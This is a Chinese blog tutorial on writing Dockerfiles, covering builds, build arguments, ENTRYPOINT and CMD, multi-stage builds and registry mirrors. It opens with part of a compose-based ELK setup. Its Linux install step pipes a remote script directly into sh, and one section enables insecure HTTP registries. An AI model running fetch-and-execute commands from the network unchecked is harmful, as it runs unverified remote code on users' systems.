      <span class="token punctuation">-</span> JRUBY_OPTS=<span class="token punctuation">-</span>J<span class="token punctuation">-</span><span class="token punctuation">-</span>illegal<span class="token punctuation">-</span>access=warn
    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> elasticsearch
  <span class="token key atrule">kibana</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> elastic/kibana
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> kibana
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> 5601<span class="token punctuation">:</span><span class="token number">5601</span>
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span> 
      <span class="token punctuation">-</span> ./kibana.yml<span class="token punctuation">:</span>/usr/share/kibana/config/kibana.yml<span class="token punctuation">:</span>ro
    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> elasticsearch
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 2.3.1</strong></p>
<p>注意由于 elasticsearch 镜像中要求不能使用 root 用户启动，其内部使用 elasticsearch 用户启动，且 elasticsearch 的 uid 和 gid 的值都是 <code>1000</code>，所以要提前将挂载的 <code>data</code> <code>log</code> 目录都修改一下所属用户，即运行 <code>chown -R 1000:1000 data log</code>。 </p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://www.cnblogs.com/woshimrf/p/understand-docker-uid.html">docker挂载volume的用户权限问题,理解docker容器的uid</a></li>
</ul>
<blockquote>
<p>本教程源代码项目：<a href="https://gitlab.com/yunnysunny/docker-compose-tutorial">https://gitlab.com/yunnysunny/docker-compose-tutorial</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Cloud Native</category>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title>dockerfile 使用教程</title>
    <url>/posts/dockerfile-tutorials/</url>
    <content><![CDATA[<h2 id="0-安装"><a href="#0-安装" class="headerlink" title="0 安装"></a>0 安装</h2><h3 id="0-1-Linux"><a href="#0-1-Linux" class="headerlink" title="0.1 Linux"></a>0.1 Linux</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="0-2-Windows"><a href="#0-2-Windows" class="headerlink" title="0.2 Windows"></a>0.2 Windows</h3><p>安装 <a href="https://www.docker.com/products/docker-desktop">docker desktop</a>。其基于 WSL2，需要安装 <a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10#manual-installation-steps">WSL2</a> ，否则无法启动。具体教程可以参见之前的博文 <a href="https://blog.whyun.com/posts/wsl-and-docker-desktop-install/">wsl 和 docker desktop 的安装教程</a>。</p>
<h2 id="1-dockerfile"><a href="#1-dockerfile" class="headerlink" title="1 dockerfile"></a>1 dockerfile</h2><h3 id="1-1-简单示例"><a href="#1-1-简单示例" class="headerlink" title="1.1 简单示例"></a>1.1 简单示例</h3><p>一个简单 dockerfile 的示例：</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM centos:7
COPY CentOS-Base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>代码 1.1.1 Dockerfile</strong></p>
<p>使用 <code>docker build . -t mycentos</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># docker build . -t mycentos
Sending build context to Docker daemon   5.12kB
Step 1&#x2F;2 : FROM centos:7
 ---&gt; 8652b9f0cb4c
Step 2&#x2F;2 : COPY CentOS-Base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo
 ---&gt; f3e54049025a
Successfully built f3e54049025a
Successfully tagged mycentos:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>输出 1.1.1</strong></p>
<p>注意命令中有一个 <code>.</code> 代表从命令行运行目录中寻找要构建的文件，<strong>代码 1.1.1</strong> 的第二行有一个 COPY 操作，其构建的时候会将当前目录中的 <code>CentOS-Base.repo</code> 拷贝覆盖到 <code>/etc/yum.repos.d/CentOS-Base.repo</code>。如果说你构建所需的文件都在命令行运行的上层目录，则可以把 <code>.</code> 换成 <code>..</code>，如果构建所需的文件都在 <code>/xx</code> 目录中，可以把 <code>.</code> 换成 <code>/xx</code>。</p>
<p>如果你运行docker build 的目录中没有 dockerfile，或者其名字不叫 <code>Dockerfile</code>, 可以使用 <code>-f</code>( 或者 <code>--file</code> ) 参数来手动指定，比如说 <code>docker build -f ./somepath/xx.Dockerfile</code>，将读取 <code>somepath</code> 子目录下的 <code>xx.Dockerfile</code> 文件。</p>
<p><code>-t</code> 参数指定构建出来的镜像的标签，执行 <code>docker images</code> 命令，可以查看当前构建好（或者下载好）的镜像列表：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># docker images
REPOSITORY TAG        IMAGE ID       CREATED         SIZE
mycentos   latest     f3e54049025a   6 minutes ago   204MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如果 docker build 没有指定 -t 参数的话，<code>REPOSITORY</code> 栏和 <code>TAG</code> 栏会显示为 <code>&lt;none&gt;</code>。-t 参数指定标签的时候的语法是 <code>$&#123;name&#125;[:$&#123;version&#125;]</code>， <code>$&#123;version&#125;</code> 没有指定的话，默认为 <code>latest</code>。</p>
<p><strong>代码 1.1.1 ** 中的每一个命令在构建的时候，docker 都会创建一个临时 docker 来执行对应的命令，</strong>输出 1.1.1** 中可以看出一共做了两步构建，生成了两个临时 docker（<code>8652b9f0cb4c</code> 和 <code>f3e54049025a</code>）。</p>
<p>对于第一个命令 <code>FROM centos:7</code>, 如果你是第一次在某个 dockerfile 中使用的话，会触发一次初始化拉取动作，由于我之前已经拉取过 centos:7 这个镜像了，所以 <strong>输出 1.1.1</strong> 并没有显示拉取操作。对于 FROM 命令来说，其指定的镜像如果本地存在，则直接使用本地的，所以如果你想保持追踪最新的父镜像，则需要在执行 docker build 命令之前，先执行一下 <code>docker pull 父镜像</code>，比如说对于 <strong>代码 1.1.1</strong> 来说，需要运行 <code>docker pull centos:7</code>。</p>
<p>对于 COPY 命令来说，其会将当前文件的权限一块拷贝到镜像中，如果当前待拷贝的是脚本文件，且希望其后续能被执行，则需要确保其有可执行权限。在 Windows 中，默认就是有执行权限的。但是我们一般是将 dockerfile push 到远程 git 仓库，然后触发 CI 来构建镜像，这个时候你需要确保在 git 中当前脚本文件具有可执行权限，对应的 git 命令为 <code>git update-index --chmod +x somefile</code>，注意你需要通过 git add 将其添加到 git 仓库后才能运行 git update-index 命令。由于我们当前要添加的文件，仅仅是个配置文件，不需要可执行权限，所以这里没有更改其权限的必要。</p>
<p><strong>输出 1.1.1</strong> 中显示了构建出来的镜像的 ID，即 <code>IMAGE ID</code> 栏显示的 <code>f3e54049025a</code>，这个也在 docker images 命令中显示出来。</p>
<p>docker 本身具有缓存机制，命令在本地运行过一次后，下次运行就会走缓存，我们再运行一次 build 命令：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker build . -t mycentos
Sending build context to Docker daemon   5.12kB
Step 1&#x2F;2 : FROM centos:7
 ---&gt; 8652b9f0cb4c
Step 2&#x2F;2 : COPY CentOS-Base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo
 ---&gt; Using cache
 ---&gt; f3e54049025a
Successfully built f3e54049025a
Successfully tagged mycentos:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>输出 1.1.2</strong></p>
<p>会看到 Step 2&#x2F;2 中显示的是使用缓存(<code>Using cache</code>)，并且镜像 ID 还是为 <code>f3e54049025a</code>，跟第一次构建时生成的一样。</p>
<h3 id="1-2-传递参数"><a href="#1-2-传递参数" class="headerlink" title="1.2 传递参数"></a>1.2 传递参数</h3><p>Dockerfile 中可以支持传递参数来做个性化构建，如果你需要构建的镜像中使用的软件包有多个版本，那么你就可以通过传递参数的方式指定当前要构建的软件的版本号，从而生成不同的镜像。</p>
<p>举个例子，以下是一个构建 zookeeper 的 Dockerfile（<strong>代码1.2.1</strong>可以从<a href="https://code.aliyun.com/yunnysunny/dockerfiles/tree/master/zookeeper/Dockerfile">这里</a>找到）</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM openjdk:11

COPY install_zk.sh &#x2F;data&#x2F;install_zk.sh
RUN sed -i &#39;s&#x2F;deb.debian.org&#x2F;mirrors.ustc.edu.cn&#x2F;g&#39; &#x2F;etc&#x2F;apt&#x2F;sources.list
RUN apt-get update
RUN apt-get install wget -y
ARG ZOOKEEPER_VERSION
# ENV ZOOKEEPER_VERSION $ZOOKEEPER_VERSION
RUN &#x2F;data&#x2F;install_zk.sh

CMD [&quot;&#x2F;opt&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh&quot;, &quot;start-foreground&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.2.1</strong></p>
<p>为了方便我们构建镜像，我们先新建一个 build.sh 文件（<a href="https://code.aliyun.com/yunnysunny/dockerfiles/tree/master/zookeeper/build.sh">代码</a>可以从这里找到）：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#!&#x2F;bin&#x2F;bash
set -e
ZOOKEEPER_VERSION&#x3D;3.7.0

docker pull openjdk:11
docker build . -f Dockerfile -t registry.cn-hangzhou.aliyuncs.com&#x2F;whyun&#x2F;base:zookeeper-$&#123;ZOOKEEPER_VERSION&#125; --build-arg ZOOKEEPER_VERSION&#x3D;$&#123;ZOOKEEPER_VERSION&#125;
if [ &quot;$NEED_PUSH&quot; &#x3D; &quot;1&quot; ] ; then
    docker push registry.cn-hangzhou.aliyuncs.com&#x2F;whyun&#x2F;base:zookeeper-$&#123;ZOOKEEPER_VERSION&#125;
fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.2.2</strong></p>
<blockquote>
<p><strong>代码 1.2.1</strong> 中 FROM 参数中使用的镜像是托管在 dockerhub 上的，很多公司都会自建镜像仓库，比如说我在 代码 1.2.2 中将构建出来的镜像推送到了阿里云仓库中。如果有新的镜像要依赖于我刚才构建出来的镜像，那么 FROM 会写成这样：</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM registry.cn-hangzhou.aliyuncs.com&#x2F;whyun&#x2F;base:zookeeper-3.7.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>docker 遇到这句话的时候，会自动拼接一个 https 的地址进行请求。不过有一种特殊情况就是，公司的运维人员在搭建自建镜像仓库的时候，没有启用 https ，而是直接用了 http 协议，那么 FROM 指令可能就是这样的：</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM registry.private.com:port&#x2F;image-name:tag-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>那么你就需要更改你的 docker 的配置文件，Linux 下位于 &#x2F;etc&#x2F;docker&#x2F;daemon.json，添加如下配置：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"insecure-registries"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">"registry.private.com:port"</span>
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>Windows 下，直接在设置界面的 Docker Engine 菜单做修改。修改完成后都需要重启 docker 服务。</p>
</blockquote>
<p><strong>代码 1.2.2</strong> 中我们先做了一个 docker pull 操作，保证我们用的父镜像是最新的。然后做 docker build 的时候，增加了一个 –build-arg 参数。启用来指定构建参数 ZOOKEEPER_VERSION 为 3.7.0，同时在 <strong>代码 1.2.1</strong> 中通过 <code>ARG ZOOKEEPER_VERSION</code> 来做声明，这句话是必须的，否则传递过来的 –build-arg 不会被读取。</p>
<p>我们在脚本 <code>install_zk.sh</code> （完整代码可以从<a href="https://code.aliyun.com/yunnysunny/dockerfiles/tree/master/zookeeper/install_zk.sh">这里</a>找到）中可以引用了环境变量 <code>ZOOKEEPER_VERSION</code>，这个变量的值就是通过 <code>ARG ZOOKEEPER_VERSION</code> 传递过来的:</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#!&#x2F;bin&#x2F;bash

ZOOKEEPER_FILENAME&#x3D;apache-zookeeper-$ZOOKEEPER_VERSION-bin
ZOOKEEPER_ARCHIVE_NAME&#x3D;$ZOOKEEPER_FILENAME.tar.gz

ZOOKEEPER_DOWNLOAD_ADDRESS&#x3D;https:&#x2F;&#x2F;mirrors.bfsu.edu.cn&#x2F;apache&#x2F;zookeeper&#x2F;zookeeper-$ZOOKEEPER_VERSION&#x2F;$ZOOKEEPER_ARCHIVE_NAME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.2.3 install_zk.sh 的部分代码</strong></p>
<blockquote>
<p>为了方便查阅，在 <strong>代码 1.2.1</strong> 中一般还会添加一个 ENV 指令（就是代码中注释掉的那句指令，之所以这里注释掉，是为了演示单纯使用 ARG 指令，也能在 RUN 命令中读取 ARG 指定的变量的值），这样保证在镜像制作完成后，以当前镜像启动的 docker 中也可以读取到环境变量 <code>ZOOKEEPER_VERSION</code>的值，方便排查问题。</p>
</blockquote>
<p>由于我们这里使用了可执行脚本，所以在推送到 git 仓库之前，需要运行 git update-index 命令，以保证在 Linux 上能够正常执行。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 查看当前文件权限
# git ls-tree HEAD
100644 blob e35843f658466b724a6a8bdf8f60694fb72aeb24    Dockerfile
100644 blob e69de29bb2d1d6434b8b29ae775ad8c2e48c5391    build.sh
100644 blob e678cd6d070eb2790c4bfee000ffdab3753f30ae    install_zk.sh
100644 blob 93262ed2b85d2381ddce1ceda9c56fb74a73f948    start_zk.sh
100644 blob 94167794dba6420ad4625af45586c467f0550ab4    zookeeper
# 修改权限
# git update-index --chmod +x build.sh
# git update-index --chmod +x install_zk.sh
# git update-index --chmod +x start_zk.sh
# git update-index --chmod +x zookeeper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>存储在 git 仓库中文件的权限只有 644 和 755 两种，如果你在 docker 中需要使用一些比较特殊的权限，不如说 ~&#x2F;.ssh 目录下的文件，必须是 600 权限，你还是必须在 dockerfile 中使用 RUN 指令强制将 ~&#x2F;.ssh 下的目录 chmod 成 600。</p>
<p>如果当前项目的目录层级比较深，可以在调用 ls-tree 中添加 <code>-r</code> 参数，例如下面命令可以批量查看当前项目在 git 仓库中所有没有可执行权限的 shell 文件：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git ls-tree -r HEAD | grep &quot;\.sh$&quot; | grep 100644<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</blockquote>
<p>然后重新 commit，提交代码到远程 git 仓库，就可以保证在 Linux 下正常使用了。</p>
<p>由于我们的安装操作比较复杂，我们这里做了一个 shell 文件来执行 RUN 指令，假设你想执行的命令并不负责也可以直接写在 dockerfile 中</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">RUN command1 &amp;&amp; command2 &amp;&amp; command3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>代码 1.2.4</strong></p>
<p>如果单条命令比较长，也可以使用换行</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">RUN command1 \
    &amp;&amp; command2 \
    &amp;&amp; command3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.2.5</strong></p>
<p>docker 默认启动时，是使用 root 用户进行登录，但是有一些第三方程序在设计的时候，不支持使用 root 用户来执行，这时候你必须切换到一个非 root 用户。以下代码节选自 nodebook 项目中的 <a href="https://github.com/yunnysunny/nodebook/blob/master/Dockerfile">Dockerfile</a> 文件：</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">RUN useradd -ms &#x2F;bin&#x2F;bash gitbook
RUN chown gitbook:gitbook -R &#x2F;opt

USER gitbook
RUN gitbook current
WORKDIR &#x2F;opt
COPY . &#x2F;opt
RUN gitbook pdf .<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.2.6</strong></p>
<p>由于 gitbook pdf 命令不支持使用 root 用户运行，所以这里先通过 useradd 命令创建一个名字为 <code>gitbook</code> 的用户。然后将 &#x2F;opt 的归属权更改位 <code>gitbook</code> 用户，接着使用 USER 指令将 docker 的用户切换位 <code>gitbook</code>，后面的 RUN 指令中的命令就会使用 <code>gitbook</code> 用户来运行。</p>
<h3 id="1-3-启动命令"><a href="#1-3-启动命令" class="headerlink" title="1.3 启动命令"></a>1.3 启动命令</h3><p>一般制作基础镜像时，会在 dockerfile 中指定一个 <code>ENTRYPOINT</code> 指令来 docker 启动时的自运行脚本文件；同时 dockerfile 中还可以使用 <code>CMD</code> 指令，它可以直接指定启动命令。</p>
<p>docker 在使用这两个指定的策略是这样的：</p>
<p>如果当前 dockerfile 和其应用的父级（包括其父级的父级） dockerfile 中没有任何 <code>ENTRYPOINT</code> 和 <code>CMD</code> 指定，则制作好的镜像在进行 docker run 时立即退出，其实这种情况下制作的镜像没有任何意义。</p>
<p>当前镜像有 <code>ENTRYPOINT</code>，则容器在启用的时候会执行 <code>ENTRYPOINT</code> 指定的脚本文本，这里我们演示一下：</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM centos:7
ADD hang.sh &#x2F;hang.sh
ENTRYPOINT [ &quot;&#x2F;hang.sh&quot; ]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.3.1 hang.Dockerfile</strong></p>
<p>执行 <code> docker build . -t hang -f hang.Dockerfile</code> 构建镜像，然后执行 <code>docker run --rm --name myhang hang</code>  来在前台运行我们的 docker 容器，这里加了一个 <code>--rm</code> 参数，这样我们使用 CTRL + C 退出控制台的时候，容器会被 stop 并且级联删除，省的我们自己手动删了。 然后我们重新打开一个控制台窗口，输入命令 <code>docker exec -it myhang bash</code> 即可进入我们当前创建的容器，在里面可以执行 shell 命令行做调试工作。<br>看上去使用 <code>ENTRYPOINT</code> 指令已经完美解决我们的问题，<code>CMD</code> 命令感觉比较多余，其实并不是这样，<code>ENTRYPOINT</code> 和 <code>CMD</code> 有一个隐藏功能。考虑一个简单情况，当两者都出现一个 dockerfile 中：</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM centos:7
COPY parent.sh &#x2F;parent.sh
COPY sub.sh &#x2F;sub.sh
COPY hang.sh &#x2F;hang.sh
ENTRYPOINT [ &quot;&#x2F;parent.sh&quot; ]
CMD [ &quot;&#x2F;sub.sh&quot; ]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.3.2 both.Dockerfile</strong></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#!&#x2F;bin&#x2F;bash

echo &#39;this is from entrypoint&#39;
# some init shell

exec &quot;$@&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.3.3 parent.sh</strong></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#!&#x2F;bin&#x2F;bash

echo &#39;this is from cmd&#39;

#other command...
&#x2F;hang.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.3.4 sub.sh</strong></p>
<p>这里同时指定了 ENTRYPOINT 和 CMD 指令，那么运行结果是后者覆盖前者吗？先别下结论，我们构建出来镜像运行看看。</p>
<p>运行如下命令</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker build . -t both -f both.Dockerfile
docker run --rm --name myboth both<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p> 会直接输出</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">this is from entrypoint
this is from cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>两个脚本的内容都输出了，难道是 ENTRYPOINT 和 CMD 两个指令先后被执行吗？注意代码 1.3.3 中的最后一行 <code>exec &quot;$@&quot;</code>，其意思是将脚本命令行中输入的参数当成命令来运行。对于 <code>both.Dockerfile</code> 来说其制作出来的镜像，最终启动的命令为 <code>/parent.sh /sub.sh</code>（CMD 指令被当成了 ENTRYPOINT 指令的参数），这个命令中的<code>/sub.sh</code> 被当成了 <code>parent.sh</code> 的命令行参数，也就是 <code>$@</code> 的值为 <code>/sub.sh</code>。</p>
<p>总结一下，如果 ENTRYPOINT 和 CMD 同时出现时，最终运行效果为 CMD 中的指令会被当成 ENTRYPOINT 中脚本的参数。这个特性隐藏的比较深，可能好多初学者不清楚。同时它会给我们启发，我可以在父层镜像中指定 ENTRYPOINT 来做初始化操作，在最后一行加上 <code>exec &quot;$@&quot;</code>，然后子镜像中使用的 CMD 就可以执行个性化的命令了。</p>
<p>为了做对比，我们再做一个镜像文件：</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM centos:7
COPY single.sh &#x2F;single.sh
COPY sub.sh &#x2F;sub.sh
COPY hang.sh &#x2F;hang.sh
ENTRYPOINT [ &quot;&#x2F;single.sh&quot; ]
CMD [ &quot;&#x2F;sub.sh&quot; ]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.3.5 single.Dockerfile</strong></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#!&#x2F;bin&#x2F;bash

echo &#39;this is from entrypoint&#39;
# some init shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.3.6 single.sh</strong></p>
<p>single.sh 和 parent.sh 相比少了 <code>exec &quot;$@&quot;</code>，我们通过如下命令来进行构建和运行：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker build . -t single -f single.Dockerfile
docker run --rm --name mysingle single<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>运行完成之后，docker 立即退出了，<code>/sub.sh</code> 未被执行。</p>
<p>父子镜像组合使用 <code>CMD</code> 和 <code>ENTRYPOINT</code> 时，可能出现更为复杂的情况，总结如下：</p>
<table>
<thead>
<tr>
<th align="center">父镜像</th>
<th align="center">子镜像</th>
<th align="center">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CMD</td>
<td align="center">CMD</td>
<td align="center">只执行子 CMD</td>
</tr>
<tr>
<td align="center">CMD</td>
<td align="center">ENTRYPOINT</td>
<td align="center">只执行子 ENTRYPOINT</td>
</tr>
<tr>
<td align="center">ENTRYPOINT</td>
<td align="center">CMD</td>
<td align="center">父ENTRYPOINT，子CMD均被执行</td>
</tr>
<tr>
<td align="center">ENTRYPOINT</td>
<td align="center">ENTRYPOINT</td>
<td align="center">只执行子 ENTRYPOINT</td>
</tr>
</tbody></table>
<blockquote>
<p>同一指令后者会覆盖前者，<code>ENTRYPOINT</code> 是 docker 启动的入口点，而 <code>CMD</code> 是入口点的传参。当未显式设置 <code>ENTRYPOINT</code> 时，可以理解成默认的 <code>ENTRYPOINT</code> 为 <code>exec &quot;$@&quot;</code>。</p>
</blockquote>
<h3 id="1-4-构建阶段"><a href="#1-4-构建阶段" class="headerlink" title="1.4 构建阶段"></a>1.4 构建阶段</h3><p>我们通过 docker 来构建镜像的时候，免不了要做代码编译打包等操作，很多编程语言需要编译环境来能构建可执行应用包，但是这些编译环境个头比较大，而且服务器环境运行应用时很多编译用的工具根本不需要，如果在镜像中包含这些工具，平白无故会增加很多体积。构建阶段就是在这种场景下应运而生的。</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile"># 这个基础镜像的构建文件位于这里：https:&#x2F;&#x2F;code.aliyun.com&#x2F;yunnysunny&#x2F;dockerfiles&#x2F;blob&#x2F;master&#x2F;go 
FROM registry.cn-hangzhou.aliyuncs.com&#x2F;whyun&#x2F;base:golang-1.17.2 AS build-stage
COPY . &#x2F;opt
WORKDIR &#x2F;opt
# RUN ssh -vT git@gitlab.com
RUN mkdir -p bin &amp;&amp; go mod tidy &amp;&amp; go build -o bin&#x2F;use-my

FROM scratch AS export-stage
COPY --from&#x3D;build-stage &#x2F;opt&#x2F;bin&#x2F;use-my &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.4.1 bin.Dockerfile</strong></p>
<p>docker build 时通过 <code>--target $&#123;targetName&#125;</code> 可以手动运行的阶段，如果不指定的话，就从头到尾运行完整个 dockerfile。比如说 代码 1.4.1 中 使用参数 <code>--target build-stage</code> 可以直接执行 build-stage 阶段的构建，忽略 export-stage 阶段的构建。不加参数的话，会构建 export-stage 阶段，当然也会级联构建 build-stage 阶段。</p>
<p>scratch 镜像是一个特殊的镜像，里面没有任何文件，一般是用来配合将镜像中的生成物做导出用的。不过这个导出功能属于新特性，目前只有在开启 <a href="https://docs.docker.com/develop/develop-images/build_enhancements/">BuildKit</a> 特性的情况下才支持。下面给出 <strong>代码 1.4.1</strong> 的构建脚本：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mkdir -p bin
docker pull registry.cn-hangzhou.aliyuncs.com&#x2F;whyun&#x2F;base:golang-1.17.2
DOCKER_BUILDKIT&#x3D;1 docker build --file bin.Dockerfile --output bin .<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.4.2</strong></p>
<blockquote>
<p>代码 1.4.1 和 代码 1.4.2 , 可以从项目 <a href="https://gitlab.com/yunnysunny/use-my">use-my</a> 中找到。</p>
</blockquote>
<h2 id="2-已知问题"><a href="#2-已知问题" class="headerlink" title="2 已知问题"></a>2 已知问题</h2><h3 id="2-1-清理磁盘"><a href="#2-1-清理磁盘" class="headerlink" title="2.1 清理磁盘"></a>2.1 清理磁盘</h3><p>在 <strong>1.1</strong> 小节讲到 dockerfile 中的每一个命令都会创建一个临时 docker，但是如果你的 dockerfile 文件有问题，执行到一半退出了，那么这些临时 docker 不会被删除，同时这些临时 docker 还会对应临时镜像，也会被保留，素以我们需要定期清理。</p>
<p>docker 1.13 版本开始提供了一个实用的命令, <code>docker system prune</code> 可以用来清理没有用的镜像，通过 <code>docker system df</code> 可以查看当前所有镜像占用的磁盘统计信息。</p>
<p>如果你的 docker 版本低于 1.13，可以执行以下脚本来删除： </p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#!&#x2F;bin&#x2F;bash
docker stop $(docker ps -a | grep &quot;Exited&quot; | awk &#39;&#123;print $1 &#125;&#39;)
docker rm $(docker ps -a | grep &quot;Exited&quot; | awk &#39;&#123;print $1 &#125;&#39;)
docker rmi $(docker images | grep &quot;none&quot; | awk &#39;&#123;print $3&#125;&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 2.1.1 清理 docker 镜像脚本</strong></p>
<h3 id="2-2-拉取基础镜像缓慢"><a href="#2-2-拉取基础镜像缓慢" class="headerlink" title="2.2 拉取基础镜像缓慢"></a>2.2 拉取基础镜像缓慢</h3><p>默认的镜像仓库地址是托管在 dockerhub 上，由于众所周知的原因，国外的网站在咱们这里访问并不稳定，并且 dockerhub 本身处于商业考量，还会对用户的访问进行限速，所以我们一般会在 docker 的配置文件中修改镜像仓库地址，将其指向国内地址。</p>
<p>具体配置文件在 Linux 下是 &#x2F;etc&#x2F;docker&#x2F;daemon.json，修改其中的 <code>registry-mirrors</code> 属性即可：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">,</span>
    <span class="token string">"https://hub-mirror.c.163.com"</span><span class="token punctuation">,</span>
    <span class="token string">"https://mirror.baidubce.com"</span><span class="token punctuation">,</span>
    <span class="token string">"https://registry.docker-cn.com"</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> <strong>代码 2.2.1</strong></p>
